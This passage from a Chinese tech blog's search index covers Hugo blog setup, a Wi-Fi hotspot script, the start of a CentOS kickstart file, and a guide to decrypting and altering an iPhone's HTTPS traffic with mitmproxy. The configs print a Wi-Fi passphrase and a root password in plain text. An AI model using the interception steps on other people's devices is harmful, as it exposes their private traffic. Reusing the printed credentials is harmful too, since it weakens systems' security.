首先我们要去github开一个xxx.github.io的repo仓库，然后 git 把生成的静态内容推上去就好了\ncd MyBlog #生成静态文件 ../hugo --buildDrafts #文件生成的目录是public cd public #正常git操作就可以了 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin git@github.com:zhangrr/zhangrr.github.io.git git push -u origin main 八、看下结果 打开网页 http://zhangrr.github.io 就能看到网页了\n​\n九、选择写作软件 其实现在开始才是最重要的，用什么软件来写，就用大家推荐的 Typora 来就好了\n# or use # sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add - # add Typora\u0026#39;s repository sudo add-apt-repository \u0026#39;deb https://typora.io/linux ./\u0026#39; sudo apt-get update # install typora sudo apt-get install typora 十、选择目录存放格式 这个才是最主要的问题，看下图，post目录是所有文章，下面按目录存放，目录名是日期和文章名，目录里面是index.md和文章附带的图片。\n我觉得这个模式才是符合我的要求的。\n. ├── post │ ├── 2018-01-11-关联了两款小程序.md │ └── index.md │ ├── 2018-02-05-一款小小的物流数据产品.md │ └── index.md │ ├── 2018-03-19-现已加入 Algolia 搜索服务.md │ └── index.md │ ├── 2018-04-13-我是如何搞砸了本站搜索服务的.md │ └── index.md │ ├── 2018-04-18-小站构建工具已成功切换到 Hugo.md │ └── index.md │ ├── 2018-04-19-开始翻译一个文档：Saleor.md │ └── index.md │ ├── 2018-04-22-Saleor 初稿已翻译完成.md │ └── index.md │ ├── 2018-04-26-今天全是干货 │ │ ├── IMG_5991-4755089.jpg │ │ ├── IMG_5997-4755064.jpg │ │ ├── IMG_5998-4755103.jpg │ │ ├── IMG_5999-4755051.jpg │ │ ├── IMG_6001-4755073.jpg │ │ ├── IMG_6002-4755080.jpg │ │ ├── IMG_6003-4755030.jpg │ │ ├── IMG_6004-4755009.jpg │ │ └── index.md │ ├── 2018-05-02-从 Jekyll 到 Hugo 的一些细节.md │ └── index.md │ └── 2018-05-03-Hugo 的文件管理方案.md │ └── index.md 十一、微调 Typora 为了能显示目录结构Outline，所以所有副标题需要用 ctrl+2 的标题文本，这样就能自动生成Outline\n为了能让剪贴板自动把ctrl+v贴上的图片放到目录里面，需要设置Image\n这样就完美了，以后就在这里写工作博客了。\n十二、更新， Typora 的降级 最新消息，Typora 升到了 1.0 ，开始收费了。\n免费的最后一个版本是 typora 0.11.18 版本，还好能下到：\n下载地址：https://download.typora.io/linux/typora_0.11.18_amd64.deb\n回退方法：\nsudo apt autoremove typora sudo dpkg -i typora_0.11.18_amd64.deb sudo add-apt-repository --remove \u0026#39;deb https://typora.io/linux ./\u0026#39; ","permalink":"https://rendoumi.com/posts/20211015-hugo_blog/","summary":"\u003cp\u003e本站这个博客的由来：\u003c/p\u003e\n\u003cp\u003e源自于 wiredcraft 的面试，这个公司让老八很是向往，可以远程工作，第一次面试是 devops ，老外见面聊了后，由代理中国人面。因为面的是K8S的东西，正好刚给画包包公司做了整体迁往阿里ACK的工程，以为没问题，实际是直接问倒了我。就好比master node上面都跑了什么进程，唉，一言难尽啊，又问到ansible的变量，回答估计也不满意，结果就挂了\u003c/p\u003e\n\u003cp\u003e知耻而后勇，后面去恶补了一下ansible和k8s的东西，实际也是实际操作居多，然后第二次面的是 sysadmin，全程老外面。还出了几道题，应该是没问题。但是工资要高了，也被刷了。\u003c/p\u003e\n\u003cp\u003e这个博客就是其中一道题，那既然搭建出来了，干脆就好好用吧。\u003c/p\u003e\n\u003cp\u003e本身自己对静态的 Blog 系统也比较感兴趣，自己主站 \u003ca href=\"https://www.rendoumi.com\"\u003ewww.rendoumi.com\u003c/a\u003e 的 Blog 是由 journey 搭建的，是一个精巧的 go 程序，最妙的是它兼容 Ghost 博客系统，也能使用 Ghost 的 theme ，这样就完美的把自己以前 Ghost 的博客迁移了过去，但是，里面文章有很多过时了，但也不想清理，干脆借着这个机会，从新开始。搭一个自己喜欢的系统继续写新博客\u003c/p\u003e\n\u003cp\u003e流行的 Markdown 写作平台有Hexo和Hugo，选Hugo是因为实在是不喜欢node，弄一堆npm，迁移麻烦死。\u003c/p\u003e\n\u003cp\u003e这个博客程序基于Hugo，托管在 github，众所周知，github 是托管静态文件的地方，Markdown的最大毛病是图片。图片放在图床也不是好办法，所以图片和静态文件要在一起，下面就说一下搭建过程，我的主机是Ubuntu：\u003c/p\u003e\n\u003ch2 id=\"一下载hugo\"\u003e一、下载Hugo\u003c/h2\u003e\n\u003cp\u003e下载地址： \u003ca href=\"https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\"\u003ehttps://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf hugo_0.88.1_Linux-64bit.tar.gz          \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二初始一个博客写作目录\"\u003e二、初始一个博客写作目录\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./hugo new site MyBlog   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e​\u003c/p\u003e\n\u003ch2 id=\"三下载theme\"\u003e三、下载theme\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e MyBlog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo                                                   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003etheme\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003ebeautifulhugo\u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; config.toml   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e​\u003c/p\u003e\n\u003ch2 id=\"四写一篇新文章\"\u003e四、写一篇新文章\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd MyBlog\n../hugo new posts/my-first-post.md                                                                                               echo \u0026#34;#### This is another Blog\u0026#34; \u0026gt;\u0026gt; content/posts/my-first-post.md  \n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"五运行serverbuild草稿\"\u003e五、运行server，build草稿\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e MyBlog                                                                                                                       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e../hugo server --buildDrafts   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e​\u003c/p\u003e","title":"本站博客的由来以及搭建使用教程"},{"content":"上一篇文章，我们实施了Ubuntu下wifi热点的搭建，那么，其实我是想抓我iphone手机的https明文流量包来着。\n怎么抓取呢？\n方法也很简单\n一、安装 mitmproxy 有wifi热点那台机器的wlan网卡地址是192.168.222.1，就在那台上安装，便于抓取\npip install mitmproxy 二、运行mitmproxy mitmproxy -p 8080 三、配置iphone安装mitm证书 打开手机，获取wifi热点，设置这个wifi使用手机代理，192.168.222.1:8080\n然后用Safari浏览器打开网址：http://mitm.it\n找到IOS那行，仔细看一看说明\n点击 Get mitmproxy-ca-cert.pem 安装描述文件\n安装完以后，在设置 \u0026ndash;\u0026gt; 已下载描述文件，安装描述文件\n安装好以后会显示绿色的已验证\n然后在手机上用 safari 访问网址：https://ip138.com\n回到 Ubuntu 的命令行窗口，上下选中抓到的包，然后按回车查看，左右光标键移动，可以看到response是明文的，q键是返回上一级\n四、包的拦截修改 上面演示的是常规的查看操作，下面介绍一下 mitmproxy 的另一强大功能，拦截修改 request 和 response。\n输入 i，然后输入 ~s 再按回车键，这时候就进入了 response 拦截模式。如果输入 ~q 则进入 request 的拦截模式，更多的命令可以输入 ？ 查看。拦截模式下的页面显示如下图所示：\n其中红色的表示请求正被拦截，这时 Enter 进入后 再按 e 就可以修改 request 或者 response。修改时是用 vim 进行编辑的，修改完成后按 a 将请求放行，如果要放行所有请求输入 A 即可。\n","permalink":"https://rendoumi.com/posts/20211014-iphone_hijack/","summary":"\u003cp\u003e上一篇文章，我们实施了Ubuntu下wifi热点的搭建，那么，其实我是想抓我iphone手机的https明文流量包来着。\u003c/p\u003e\n\u003cp\u003e怎么抓取呢？\u003c/p\u003e\n\u003cp\u003e方法也很简单\u003c/p\u003e\n\u003ch2 id=\"一安装-mitmproxy\"\u003e一、安装 mitmproxy\u003c/h2\u003e\n\u003cp\u003e有wifi热点那台机器的wlan网卡地址是192.168.222.1，就在那台上安装，便于抓取\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install mitmproxy\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二运行mitmproxy\"\u003e二、运行mitmproxy\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emitmproxy -p \u003cspan class=\"m\"\u003e8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"三配置iphone安装mitm证书\"\u003e三、配置iphone安装mitm证书\u003c/h2\u003e\n\u003cp\u003e打开手机，获取wifi热点，设置这个wifi使用手机代理，192.168.222.1:8080\u003c/p\u003e\n\u003cp\u003e然后用Safari浏览器打开网址：http://mitm.it\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014144813987.png?width=200px\"\u003e\u003c/p\u003e\n\u003cp\u003e找到\u003cstrong\u003eIOS\u003c/strong\u003e那行，仔细看一看说明\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014144923443.png?width=200\"\u003e\u003c/p\u003e\n\u003cp\u003e点击 Get mitmproxy-ca-cert.pem 安装描述文件\u003c/p\u003e\n\u003cp\u003e安装完以后，在设置 \u0026ndash;\u0026gt; 已下载描述文件，安装描述文件\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014145145002.png?width=200\"\u003e\u003c/p\u003e\n\u003cp\u003e安装好以后会显示绿色的已验证\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014154731414.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后在手机上用 safari 访问网址：https://ip138.com\u003c/p\u003e\n\u003cp\u003e回到 Ubuntu 的命令行窗口，上下选中抓到的包，然后按回车查看，左右光标键移动，可以看到response是明文的，q键是返回上一级\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211014150022475\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014150022475.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"四包的拦截修改\"\u003e四、包的拦截修改\u003c/h2\u003e\n\u003cp\u003e上面演示的是常规的查看操作，下面介绍一下 mitmproxy 的另一强大功能，拦截修改 request 和 response。\u003c/p\u003e\n\u003cp\u003e输入 \u003ccode\u003ei\u003c/code\u003e，然后输入 \u003ccode\u003e~s\u003c/code\u003e 再按回车键，这时候就进入了 response 拦截模式。如果输入 \u003ccode\u003e ~q\u003c/code\u003e 则进入 request 的拦截模式，更多的命令可以输入 \u003ccode\u003e？\u003c/code\u003e 查看。拦截模式下的页面显示如下图所示：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211014150501427\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014150501427.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中红色的表示请求正被拦截，这时 Enter 进入后 再按 \u003ccode\u003ee\u003c/code\u003e 就可以修改 request 或者 response。修改时是用 vim 进行编辑的，修改完成后按 \u003ccode\u003ea\u003c/code\u003e 将请求放行，如果要放行所有请求输入 \u003ccode\u003eA\u003c/code\u003e 即可。\u003c/p\u003e","title":"Iphone手机的https抓包"},{"content":"公司的wifi信号很弱，也不保险。省事起见，还是自己建立一个好\nusb无线网卡设备必须是一个 nl80211 兼容的无线设备，所以驱动就是这个：nl80211\n我的操作系统是Ubuntu，如果是CentOS命令基本一样\n插上wifi usb卡后 ip a 看一下网卡的名称，我这里是：wlx00a1b0817651，够长\n一、安装hostapd软件 sudo apt install -y hostapd 二、建立hostapd.conf文件 vi /etc/hostapd/hostapd.conf driver=nl80211 ssid=Fast_8188 channel=10 interface=wlx00a1b0817651 wpa=2 wpa_passphrase=GreatWall2021! wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP 三、建立启动脚本/usr/local/bin/initAP.sh cat /usr/local/bin/initAP.sh #!/bin/bash start() { rfkill unblock all ifconfig wlx00a1b0817651 up 192.168.222.1 netmask 255.255.255.0 sleep 2 dnsmasq -i wlx00a1b0817651 --dhcp-range=192.168.222.10,192.168.222.20,2h #Enable NAT sysctl -w net.ipv4.ip_forward=1 iptables -F iptables -X iptables -t nat -A POSTROUTING -s 192.168.222.0/24 -j SNAT --to 192.168.41.15 hostapd -B /etc/hostapd/hostapd.conf } stop() { iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT iptables -F iptables -X iptables -t nat -F iptables -t nat -X iptables -t mangle -F iptables -t mangle -X systemctl stop dnsmasq pkill hostapd /sbin/ip link set down dev wlx00a1b0817651 } case $1 in start) start ;; stop) stop ;; *) echo \u0026#34;Usage: $0 {start|stop}\u0026#34; exit 2 esac 四、用root身份执行即可 sudo chmod 755 /usr/local/bin/initAP.sh sudo /usr/local/bin/initAP.sh start 这样就可以用自己的手机连上这个wifi热点，尽情冲浪啦。\n","permalink":"https://rendoumi.com/posts/20211014-linux_wifi/","summary":"\u003cp\u003e公司的wifi信号很弱，也不保险。省事起见，还是自己建立一个好\u003c/p\u003e\n\u003cp\u003eusb无线网卡设备必须是一个 nl80211 兼容的无线设备，所以驱动就是这个：nl80211\u003c/p\u003e\n\u003cp\u003e我的操作系统是Ubuntu，如果是CentOS命令基本一样\u003c/p\u003e\n\u003cp\u003e插上wifi usb卡后 ip a 看一下网卡的名称，我这里是：wlx00a1b0817651，够长\u003c/p\u003e\n\u003ch2 id=\"一安装hostapd软件\"\u003e一、安装hostapd软件\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install -y hostapd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二建立hostapdconf文件\"\u003e二、建立hostapd.conf文件\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evi /etc/hostapd/hostapd.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edriver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003enl80211\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003essid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eFast_8188 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echannel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003einterface\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ewlx00a1b0817651\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa_passphrase\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eGreatWall2021!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa_key_mgmt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eWPA-PSK\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa_pairwise\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eTKIP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"三建立启动脚本usrlocalbininitapsh\"\u003e三、建立启动脚本/usr/local/bin/initAP.sh\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat /usr/local/bin/initAP.sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estart() {  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erfkill unblock all\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eifconfig wlx00a1b0817651 up 192.168.222.1 netmask 255.255.255.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esleep 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ednsmasq -i wlx00a1b0817651 --dhcp-range\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e192.168.222.10,192.168.222.20,2h\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Enable NAT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esysctl -w net.ipv4.ip_forward\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -F  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -X  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t nat -A POSTROUTING -s 192.168.222.0/24 -j SNAT --to 192.168.41.15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehostapd -B /etc/hostapd/hostapd.conf  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estop() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -P INPUT ACCEPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -P FORWARD ACCEPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -P OUTPUT ACCEPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -F\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t nat -F\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t nat -X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t mangle -F\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t mangle -X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop dnsmasq\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epkill hostapd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/ip link set down dev wlx00a1b0817651\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecase $1 in  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003estart)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"na\"\u003estart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e;;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003estop)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"na\"\u003estop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e;;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e*)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eecho \u0026#34;Usage: $0 {start|stop}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eexit 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"四用root身份执行即可\"\u003e四、用root身份执行即可\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo chmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /usr/local/bin/initAP.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo /usr/local/bin/initAP.sh start\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就可以用自己的手机连上这个wifi热点，尽情冲浪啦。\u003c/p\u003e","title":"Ubuntu下自建一个wifi热点供手机使用"},{"content":"某些场合，很有可能需要启动ISO或者USB盘，自带Linux系统，然后拯救当前损坏的系统\n或者直接启动一个LIVE CentOS系统，去做某些事，比如用MegaRaid划分Raid、测试系统等等\n这时候就需要制作出来一个LIVE CD的系统了\n制作步骤如下：\n一、安装live-tools yum -y install livecd-tools 二、准备Kickstart文件centos7-live-docker.ks 下载地址：centos7-live-docker.ks\nlang en_GB.UTF-8 keyboard us timezone Asia/Shanghai --isUtc #selinux --enforcing selinux --disabled #firewall --enabled --service=cockpit firewall --disabled #xconfig --startxonboot part / --size 8192 --fstype ext4 services --enabled=NetworkManager,sshd --disabled=network # Root password auth --useshadow --enablemd5 rootpw --plaintext Kalaisadog2021 